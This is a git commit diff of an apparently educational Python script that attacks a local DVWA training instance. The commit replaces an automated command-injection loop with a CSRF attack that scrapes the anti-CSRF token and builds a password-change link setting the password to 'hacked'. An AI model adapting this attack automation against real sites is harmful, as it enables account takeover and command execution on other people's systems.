c286177ee2da086efa460f5be7e078731934f7cf
p4tit0 <viniciussantoslima2003@gmail.com>
2025-02-12 15:05:45 -0500

    csrf

--- csrf/main.py
+++ csrf/main.py
@@ -6,12 +6,13 @@ from tqdm import tqdm  # Para a barra de progresso
 import os
 
 BASE_URL = "http://localhost/dvwa/"
-COMMAND_INJECTION_URL = f"{BASE_URL}/vulnerabilities/exec/"
-BASE_PATH = os.path.dirname(os.path.realpath(__file__))
-LOG_FILE = "latest.log"
-COMMANDS_FILE = "comandos.txt"
-LOG_PATH = os.path.join(BASE_PATH, LOG_FILE)
+CSRF_URL = f"{BASE_URL}/vulnerabilities/csrf/"
 
+BASE_PATH = os.path.dirname(os.path.realpath(__file__))
+
+
+FORM_NAME = "malicious_form.html"
+FORM_PATH = os.path.join(BASE_PATH, FORM_NAME)
 
 
 def get_list(filename):
@@ -29,11 +30,13 @@ def extract_message(response):
         return message_div.text.strip()
     return None
 
-def extract_output(response):
+def extract_output_message(response):
     soup = BeautifulSoup(response.text, 'html.parser')
-    pre_tag = soup.find("pre")
-    if pre_tag:
-        return pre_tag.text.strip()
+    form = soup.find("form")  # Encontra o formulário de login
+    if form:
+        next_sibling = form.find_next_sibling()
+        if next_sibling and next_sibling.name in ["p", "pre"]:
+            return next_sibling.text.strip()
     return None
 
 def log(command, status, output):
@@ -41,14 +44,8 @@ def log(command, status, output):
     log_entry = f"[{timestamp}] Comando: {command}, Status: {status}, Saída: \n{output}"
     with open(LOG_PATH, "a") as log_file:
         log_file.write(log_entry + "\n")
-
-def main():
-    with open(LOG_PATH, "w") as log_file:
-        log_file.write("")
-
-    commands = get_list(os.path.join(BASE_PATH, COMMANDS_FILE))
-
-    session = Session()
+        
+def login(session):
     login_url = f"{BASE_URL}/login.php"
 
     response = session.get(login_url)
@@ -67,6 +64,7 @@ def main():
         print("[-] Falha no login. Verifique as credenciais.")
         sys.exit(1)
 
+def set_sec(session):
     security_level = "high"
     security_url = f"{BASE_URL}/security.php"
 
@@ -88,21 +86,32 @@ def main():
             print("[-] Token CSRF incorreto. Encerrando o script.")
             sys.exit(1)
 
-    for command in tqdm(commands, desc="Progresso", unit="comando"):
-        data = {
-            "ip": command,
-            "Submit": "Submit"
-        }
+def extract_csrf_token(session):
+    response = session.get(CSRF_URL)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    csrf_token = soup.find("input", {"name": "user_token"})["value"]
+    return csrf_token
 
-        response = send_command(session, COMMAND_INJECTION_URL, data)
-        output = extract_output(response)
-
-        if output:
-            log(command, "Sucesso", output)
-            print(f"\n[+] Comando executado com sucesso: {command}")
-            print(f"[+] Saída: {output}")
-        else:
-            log(command, "Falha", "Nenhuma saída encontrada")
+def main():
+    session = Session()
+    login(session)
+    set_sec(session)
+    csrf_token = extract_csrf_token(session)
+    
+    data = {
+        "password_new": "hacked",
+        "password_conf": "hacked",
+        "user_token": csrf_token,
+        "Change": "Change"
+    }
+    
+    response = session.get(CSRF_URL,params=data)
+    print(f"[+] Link malicioso: {response.url}")
+    print(f"[+] Enviando para vítima...")
+    print(f"[+] Link Acessado!")
+    message = extract_output_message(response)
+    if message:
+        print(f"[+] Mensagem: {message}")
 
 if __name__ == "__main__":
     main()
